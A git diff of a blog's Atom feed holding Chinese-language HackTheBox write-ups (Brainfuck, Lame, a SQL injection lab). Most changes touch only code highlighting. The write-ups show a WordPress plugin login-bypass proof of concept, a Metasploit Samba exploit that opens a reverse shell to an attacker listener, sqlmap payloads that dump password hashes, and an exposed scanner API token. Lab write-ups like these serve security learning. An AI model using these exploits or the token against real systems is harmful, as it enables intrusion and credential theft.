@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-18T19:35:04+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">HackTheBox - Brainfuck</title><link href="http://localhost:4000/hack-the-box/brainfuck/" rel="alternate" type="text/html" title="HackTheBox - Brainfuck" /><published>2023-08-14T00:00:00+08:00</published><updated>2023-08-14T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/brainfuck</id><content type="html" xml:base="http://localhost:4000/hack-the-box/brainfuck/"><![CDATA[<h1 id="hackthebox---brainfuck">HackTheBox - Brainfuck</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-18T20:22:06+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">HackTheBox - Brainfuck</title><link href="http://localhost:4000/hack-the-box/brainfuck/" rel="alternate" type="text/html" title="HackTheBox - Brainfuck" /><published>2023-08-14T00:00:00+08:00</published><updated>2023-08-14T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/brainfuck</id><content type="html" xml:base="http://localhost:4000/hack-the-box/brainfuck/"><![CDATA[<h1 id="hackthebox---brainfuck">HackTheBox - Brainfuck</h1>
 <h2 id="about-brainfuck">About Brainfuck</h2>
 <p>Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.</p>
 
@@ -60,18 +60,18 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <h2 id="wpscan">WPScan</h2>
 <p>对第一个网站用WPScan扫描一下，加上扩展的漏扫和用户的枚举，要去官网注册一个免费的token，用这个token一天可以扫25次</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
-└─$ WPScan --url https://brainfuck.htb/ --disable-tls-checks --api-token FD4Mg8hQgD3ufcCLEQPSghvDCFscCOTpEPJWb6V5lVA -e vp,u -o wpscan.txt
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Brainfuck]
+└─<span class="nv">$ </span>WPScan <span class="nt">--url</span> https://brainfuck.htb/ <span class="nt">--disable-tls-checks</span> <span class="nt">--api-token</span> FD4Mg8hQgD3ufcCLEQPSghvDCFscCOTpEPJWb6V5lVA <span class="nt">-e</span> vp,u <span class="nt">-o</span> wpscan.txt
 </code></pre></div></div>
 <p>部分扫描结果</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
-└─$ cat wpscan.txt       
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Brainfuck]
+└─<span class="nv">$ </span><span class="nb">cat </span>wpscan.txt       
 _______________________________________________________________
          __          _______   _____
-         \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
+          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
+           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
             \  /\  /  | |     ____) | (__| (_| | | | |
              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 
@@ -167,48 +167,48 @@ _______________________________________________________________
 [+] Data Received: 84.54 KB
 [+] Memory used: 253.984 MB
 [+] Elapsed time: 00:00:39
-</code></pre></div></div>
+</span></code></pre></div></div>
 
 <p>可见有一个扩展叫做WP Support Plus，其存在多个漏洞，还检测到了用户admin以及administrator的存在。用searchsploit查一下这个扩展的漏洞，把注意力放在中间的权限提升漏洞上面</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
-└─$ searchsploit WP Support Plus           
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Brainfuck]
+└─<span class="nv">$ </span>searchsploit WP Support Plus           
+<span class="nt">--------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
  Exploit Title                                                                                                            |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+<span class="nt">--------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities                                  | php/webapps/34589.txt
 WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation                                    | php/webapps/41006.txt
 WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                                           | php/webapps/40939.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+<span class="nt">--------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Shellcodes: No Results
                                                                                                                                                             
-┌──(kali㉿kali)-[~/htb/Brainfuck]
-└─$ locate php/webapps/41006.txt
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Brainfuck]
+└─<span class="nv">$ </span>locate php/webapps/41006.txt
 /usr/share/exploitdb/exploits/php/webapps/41006.txt
                                                                                                                                                             
-┌──(kali㉿kali)-[~/htb/Brainfuck]
-└─$ more /usr/share/exploitdb/exploits/php/webapps/41006.txt
-# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
-# Date: 10-01-2017
-# Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
-# Exploit Author: Kacper Szurek
-# Contact: http://twitter.com/KacperSzurek
-# Website: http://security.szurek.pl/
-# Category: web
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Brainfuck]
+└─<span class="nv">$ </span>more /usr/share/exploitdb/exploits/php/webapps/41006.txt
+<span class="c"># Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation</span>
+<span class="c"># Date: 10-01-2017</span>
+<span class="c"># Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/</span>
+<span class="c"># Exploit Author: Kacper Szurek</span>
+<span class="c"># Contact: http://twitter.com/KacperSzurek</span>
+<span class="c"># Website: http://security.szurek.pl/</span>
+<span class="c"># Category: web</span>
 
 1. Description
 
-You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().
+You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie<span class="o">()</span><span class="nb">.</span>
 
 http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
 
 2. Proof of Concept
 
-&lt;form method="post" action="http://wp/wp-admin/admin-ajax.php"&gt;
-        Username: &lt;input type="text" name="username" value="administrator"&gt;
-        &lt;input type="hidden" name="email" value="sth"&gt;
-        &lt;input type="hidden" name="action" value="loginGuestFacebook"&gt;
-        &lt;input type="submit" value="Login"&gt;
+&lt;form <span class="nv">method</span><span class="o">=</span><span class="s2">"post"</span> <span class="nv">action</span><span class="o">=</span><span class="s2">"http://wp/wp-admin/admin-ajax.php"</span><span class="o">&gt;</span>
+        Username: &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"administrator"</span><span class="o">&gt;</span>
+        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"email"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"sth"</span><span class="o">&gt;</span>
+        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"action"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"loginGuestFacebook"</span><span class="o">&gt;</span>
+        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Login"</span><span class="o">&gt;</span>
 &lt;/form&gt;
 
 Then you can go to admin panel.
@@ -397,14 +397,14 @@ Session completed.
 </code></pre></div></div>
 <p>然后连接ssh，成功获取到user flag</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
-└─$ sudo ssh -i id_rsa orestis@10.10.10.17
-Enter passphrase for key 'id_rsa': 
-Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Brainfuck]
+└─<span class="nv">$ </span><span class="nb">sudo </span>ssh <span class="nt">-i</span> id_rsa orestis@10.10.10.17
+Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
+Welcome to Ubuntu 16.04.2 LTS <span class="o">(</span>GNU/Linux 4.4.0-75-generic x86_64<span class="o">)</span>
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
 
 0 packages can be updated.
 0 updates are security updates.
@@ -412,9 +412,9 @@ Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)
 
 You have mail.
 Last login: Mon Oct  3 19:41:38 2022 from 10.10.14.23
-orestis@brainfuck:~$ ls
-debug.txt  encrypt.sage  mail  output.txt  user.txt
-orestis@brainfuck:~$ cat user.txt
+orestis@brainfuck:~<span class="nv">$ </span><span class="nb">ls
+</span>debug.txt  encrypt.sage  mail  output.txt  user.txt
+orestis@brainfuck:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
 2c11cfbc5b959f73ac15a3310bd097c9
 
 </code></pre></div></div>
@@ -423,8 +423,8 @@ orestis@brainfuck:~$ cat user.txt
 
 <p>用户在lxd组中，所以可以用lxd提权</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>orestis@brainfuck:~$ id
-uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>orestis@brainfuck:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>orestis<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>orestis<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>orestis<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,121<span class="o">(</span>lpadmin<span class="o">)</span>,122<span class="o">(</span>sambashare<span class="o">)</span>
 </code></pre></div></div>
 
 <ul>
@@ -511,78 +511,78 @@ Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                
 
 <p>直接用metasploit搜索<code class="language-plaintext highlighter-rouge">Samba 3.0.20</code></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; search samba 3.0.20
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> search samba 3.0.20
 
 Matching Modules
-================
+<span class="o">================</span>
 
-   #  Name                                Disclosure Date  Rank       Check  Description
-   -  ----                                ---------------  ----       -----  -----------
+   <span class="c">#  Name                                Disclosure Date  Rank       Check  Description</span>
+   -  <span class="nt">----</span>                                <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
    0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No    
 </code></pre></div></div>
 <p>选择此模块并配置好反弹shell的相关参数，用<code class="language-plaintext highlighter-rouge">run</code>命令发起攻击，直接获取了root权限下的shell，直接打开root下的flag</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; use 0
-[*] No payload configured, defaulting to cmd/unix/reverse_netcat
-msf6 exploit(multi/samba/usermap_script) &gt; show option
-[-] Invalid parameter "option", use "show -h" for more information
-msf6 exploit(multi/samba/usermap_script) &gt; show options
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use 0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> show option
+<span class="o">[</span>-] Invalid parameter <span class="s2">"option"</span>, use <span class="s2">"show -h"</span> <span class="k">for </span>more information
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> show options
 
-Module options (exploit/multi/samba/usermap_script):
+Module options <span class="o">(</span>exploit/multi/samba/usermap_script<span class="o">)</span>:
 
    Name    Current Setting  Required  Description
-   ----    ---------------  --------  -----------
-   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT   139              yes       The target port (TCP)
+   <span class="nt">----</span>    <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   RHOSTS                   <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
 
 
-Payload options (cmd/unix/reverse_netcat):
+Payload options <span class="o">(</span>cmd/unix/reverse_netcat<span class="o">)</span>:
 
    Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.32.134   yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST  192.168.32.134   <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
 
 
 Exploit target:
 
    Id  Name
-   --  ----
+   <span class="nt">--</span>  <span class="nt">----</span>
    0   Automatic
 
 
 
-View the full module info with the info, or info -d command.
+View the full module info with the info, or info <span class="nt">-d</span> command.
 
-msf6 exploit(multi/samba/usermap_script) &gt; set rhost 10.10.10.3
-rhost =&gt; 10.10.10.3
-msf6 exploit(multi/samba/usermap_script) &gt; set rport 445
-rport =&gt; 445
-msf6 exploit(multi/samba/usermap_script) &gt; set lhost 10.10.14.4
-lhost =&gt; 10.10.14.4
-msf6 exploit(multi/samba/usermap_script) &gt; set lport 2333
-lport =&gt; 2333
-msf6 exploit(multi/samba/usermap_script) &gt; run
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhost 10.10.10.3
+rhost <span class="o">=&gt;</span> 10.10.10.3
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rport 445
+rport <span class="o">=&gt;</span> 445
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 10.10.14.4
+lhost <span class="o">=&gt;</span> 10.10.14.4
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lport 2333
+lport <span class="o">=&gt;</span> 2333
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> run
 
-[*] Started reverse TCP handler on 10.10.14.4:2333 
-[*] Command shell session 1 opened (10.10.14.4:2333 -&gt; 10.10.10.3:40919) at 2023-04-22 00:22:42 -0400
-whoami
-root
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.4:2333 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.14.4:2333 -&gt; 10.10.10.3:40919<span class="o">)</span> at 2023-04-22 00:22:42 <span class="nt">-0400</span>
+<span class="nb">whoami
+</span>root
 which python
 /usr/bin/python
-python -c 'import pty;pty.spawn("/bin/bash")'
-root@lame:/# cat /root/root.txt
-cat /root/root.txt
+python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+root@lame:/# <span class="nb">cat</span> /root/root.txt
+<span class="nb">cat</span> /root/root.txt
 162190c25286540dea9c0047e......
 </code></pre></div></div>
 <p>user下的flag</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lame:/home# find / -name user.txt 2&gt;/dev/null
-find / -name user.txt 2&gt;/dev/null
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lame:/home# find / <span class="nt">-name</span> user.txt 2&gt;/dev/null
+find / <span class="nt">-name</span> user.txt 2&gt;/dev/null
 /home/makis/user.txt
-root@lame:/home# cat /makis/user.txt
-cat /makis/user.txt
-cat: /makis/user.txt: No such file or directory
-root@lame:/home# cat makis/user.txt
-cat makis/user.txt
+root@lame:/home# <span class="nb">cat</span> /makis/user.txt
+<span class="nb">cat</span> /makis/user.txt
+<span class="nb">cat</span>: /makis/user.txt: No such file or directory
+root@lame:/home# <span class="nb">cat </span>makis/user.txt
+<span class="nb">cat </span>makis/user.txt
 a5ceb51f1741b774fbee61a559......
 </code></pre></div></div>
 <h2 id="cve-2007-2447">CVE-2007-2447</h2>
@@ -698,71 +698,71 @@ OS and Service detection performed. Please report any incorrect results at https
 
 <p>把数据包丢进sqlmap里面跑，但是不加参数跑不出来，需要加上level和risk</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5
-=================================================================================================================
-POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
-sqlmap identified the following injection point(s) with a total of 474 HTTP(s) requests:
----
-Parameter: username (POST)
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py <span class="nt">-r</span> 1.txt <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--threads</span><span class="o">=</span>5
+<span class="o">=================================================================================================================</span>
+POST parameter <span class="s1">'username'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] n
+sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 474 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+<span class="nt">---</span>
+Parameter: username <span class="o">(</span>POST<span class="o">)</span>
     Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
-    Payload: username=admin") OR NOT 8580=8580 AND ("MLnl"="MLnl&amp;password=admin
+    Title: OR boolean-based blind - WHERE or HAVING clause <span class="o">(</span>NOT<span class="o">)</span>
+    Payload: <span class="nv">username</span><span class="o">=</span>admin<span class="s2">") OR NOT 8580=8580 AND ("</span>MLnl<span class="s2">"="</span>MLnl&amp;password<span class="o">=</span>admin
 
     Type: time-based blind
-    Title: SQLite &gt; 2.0 OR time-based blind (heavy query)
-    Payload: username=admin") OR 3510=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ("YPRb"="
-YPRb&amp;password=admin
----
-[08:32:00] [INFO] the back-end DBMS is SQLite
+    Title: SQLite <span class="o">&gt;</span> 2.0 OR time-based blind <span class="o">(</span>heavy query<span class="o">)</span>
+    Payload: <span class="nv">username</span><span class="o">=</span>admin<span class="s2">") OR 3510=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ("</span>YPRb<span class="s2">"="</span>
+YPRb&amp;password<span class="o">=</span>admin
+<span class="nt">---</span>
+<span class="o">[</span>08:32:00] <span class="o">[</span>INFO] the back-end DBMS is SQLite
 web application technology: Express
 back-end DBMS: SQLite
 </code></pre></div></div>
 
 <p>查看表</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5 --tables
-================================================================================
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py <span class="nt">-r</span> 1.txt <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--threads</span><span class="o">=</span>5 <span class="nt">--tables</span>
+<span class="o">================================================================================</span>
 &lt;current&gt;
-[5 tables]
+<span class="o">[</span>5 tables]
 +-----------------+
 | bookings        |
 | notes           |
 | sessions        |
 | sqlite_sequence |
-| users           |
+| <span class="nb">users</span>           |
 +-----------------+
 </code></pre></div></div>
 <p>查看user表中的数据，得到账号 RickA和密码的md5，解密后得到密码</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5 -T users --dump
-===========================================================================================================================
-[08:38:00] [INFO] retrieved: 103
-[08:39:13] [INFO] retrieved: CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,password TEXT,active
- TINYINT(1))
-[08:39:13] [INFO] fetching entries for table 'users'
-[08:39:13] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
-[08:39:13] [INFO] retrieved: 1
-[08:39:14] [INFO] retrieving the length of query output
-[08:39:14] [INFO] retrieved: 1
-[08:39:16] [INFO] retrieved: 1
-[08:39:19] [INFO] retrieving the length of query output
-[08:39:19] [INFO] retrieved: 1
-[08:39:20] [INFO] retrieved: 1
-[08:39:23] [INFO] retrieving the length of query output
-[08:39:23] [INFO] retrieved: 32
-[08:39:49] [INFO] retrieved: fdc8cd4cff2c19e0d1022e78481ddf36
-[08:39:49] [INFO] retrieving the length of query output
-[08:39:49] [INFO] retrieved: 5
-[08:39:55] [INFO] retrieved: RickA
-[08:39:55] [INFO] recognized possible password hashes in column 'password'
-do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
-do you want to crack them via a dictionary-based attack? [Y/n/q] n
-Database: &lt;current&gt;
-Table: users
-[1 entry]
-+----+--------+----------+----------------------------------+
-| id | active | username | password                         |
-+----+--------+----------+----------------------------------+
-| 1  | 1      | RickA    | fdc8cd4cff2c19e0d1022e78481ddf36 |
-+----+--------+----------+----------------------------------+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python27</span> <span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">r</span> <span class="mf">1.</span><span class="n">txt</span> <span class="o">--</span><span class="n">level</span><span class="o">=</span><span class="mi">5</span> <span class="o">--</span><span class="n">risk</span><span class="o">=</span><span class="mi">3</span> <span class="o">--</span><span class="n">threads</span><span class="o">=</span><span class="mi">5</span> <span class="o">-</span><span class="n">T</span> <span class="n">users</span> <span class="o">--</span><span class="n">dump</span>
+<span class="o">===========================================================================================================================</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">103</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">CREATE</span> <span class="n">TABLE</span> <span class="nf">users </span><span class="p">(</span><span class="nb">id</span> <span class="n">INTEGER</span> <span class="n">PRIMARY</span> <span class="n">KEY</span> <span class="n">AUTOINCREMENT</span><span class="p">,</span><span class="n">username</span> <span class="n">TEXT</span><span class="p">,</span><span class="n">password</span> <span class="n">TEXT</span><span class="p">,</span><span class="n">active</span>
+ <span class="nc">TINYINT</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">table</span> <span class="sh">'</span><span class="s">users</span><span class="sh">'</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">number</span> <span class="n">of</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">table</span> <span class="sh">'</span><span class="s">users</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">database</span> <span class="sh">'</span><span class="s">SQLite_masterdb</span><span class="sh">'</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">14</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="n">length</span> <span class="n">of</span> <span class="n">query</span> <span class="n">output</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">14</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">19</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="n">length</span> <span class="n">of</span> <span class="n">query</span> <span class="n">output</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">19</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">20</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">23</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="n">length</span> <span class="n">of</span> <span class="n">query</span> <span class="n">output</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">23</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">32</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">fdc8cd4cff2c19e0d1022e78481ddf36</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="n">length</span> <span class="n">of</span> <span class="n">query</span> <span class="n">output</span>
